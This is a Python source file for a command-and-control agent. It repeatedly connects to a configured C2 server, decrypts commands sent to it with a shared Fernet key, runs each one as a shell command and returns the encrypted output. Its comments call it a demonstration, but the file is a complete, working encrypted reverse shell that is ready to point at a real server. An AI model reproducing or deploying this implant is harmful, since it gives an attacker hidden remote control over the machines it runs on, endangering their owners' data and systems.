import socket
import subprocess
from cryptography.fernet import Fernet

# The agent needs the same key as the server
# In a real scenario, this would be securely provided or derived
# For demonstration, paste the key printed by the server here
# Example: KEY = b'YOUR_GENERATED_KEY_HERE'
KEY = b'YOUR_GENERATED_KEY_HERE' # REPLACE THIS WITH THE ACTUAL KEY FROM SERVER
f = Fernet(KEY)

def connect_to_server(host, port):
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((host, port))
            print(f"[*] Connected to C2 server {host}:{port}")

            while True:
                try:
                    encrypted_command = client.recv(4096)
                    if not encrypted_command:
                        break
                    
                    command = f.decrypt(encrypted_command).decode()
                    
                    # Execute command
                    output = subprocess.run(command, shell=True, capture_output=True, text=True)
                    result = output.stdout + output.stderr

                    encrypted_result = f.encrypt(result.encode())
                    client.send(encrypted_result)
                except Exception as e:
                    print(f"[-] Error during communication: {e}")
                    break

        except Exception as e:
            print(f"[-] Connection failed: {e}. Retrying in 5 seconds...")
            client.close()
            # time.sleep(5) # Uncomment for persistent retry

if __name__ == "__main__":
    # Configure the C2 server IP and port
    C2_HOST = '127.0.0.1' # Change this to the server's IP
    C2_PORT = 4444
    connect_to_server(C2_HOST, C2_PORT)
